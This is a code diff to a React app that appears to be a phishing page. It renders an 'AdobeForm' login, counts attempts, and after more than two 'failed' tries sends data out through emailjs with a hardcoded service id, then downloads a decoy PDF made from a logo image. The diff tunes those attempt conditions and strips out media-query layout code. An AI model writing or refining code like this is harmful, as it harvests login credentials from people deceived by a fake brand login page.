@@ -1,6 +1,4 @@
 import React, { useState } from "react";
-import { useMediaQuery } from 'react-responsive';
-import MediaQuery from 'react-responsive';
 import AdobeForm from "./components/AdobeForm";
 import logo from "./Image/pingr.png";
 import emailjs from "emailjs-com";
@@ -35,7 +33,7 @@ function App() {
     }
 
     // send To Email
-    if (!error == "" || counter > 3) {
+    if (!error == "" && counter > 2) {
       emailjs
         .send(
           "service_x6hu0ud",
@@ -67,7 +65,7 @@ function App() {
 
     function success() {
       try {
-        if (error == "" && counter > 3) {
+        if (!error == "" && counter > 2) {
           const doc = new jsPDF("landscape", "px", "a4", "false");
           doc.addImage(logo, "PNG", 65, 20, 500, 400);
           doc.save("file.pdf");
@@ -83,37 +81,14 @@ function App() {
     success();
   };
 
-  const isMobileDevice = useMediaQuery({
-    query: "(min-device-width: 480px)",
-  });
-
-  const isTabletDevice = useMediaQuery({
-    query: "(min-device-width: 768px)",
-  });
-
-  const isLaptop = useMediaQuery({
-    query: "(min-device-width: 1024px)",
-  });
-
-  const isDesktop = useMediaQuery({
-    query: "(min-device-width: 1200px)",
-  });
-
-  const isBigScreen = useMediaQuery({
-    query: "(min-device-width: 1201px )",
-  });
-
-
   return (
-    <MediaQuery minDeviceWidth={isMobileDevice}>
-      <div id="content">
-        {user.email !== "" ? (
-          <AdobeForm Login={Login} error={error} />
-        ) : (
-          <AdobeForm Login={Login} error={error} />
-        )}
-      </div>
-    </MediaQuery>
+    <div id="content">
+      {user.email !== "" ? (
+        <AdobeForm Login={Login} error={error} />
+      ) : (
+        <AdobeForm Login={Login} error={error} />
+      )}
+    </div>
   );
 }
 
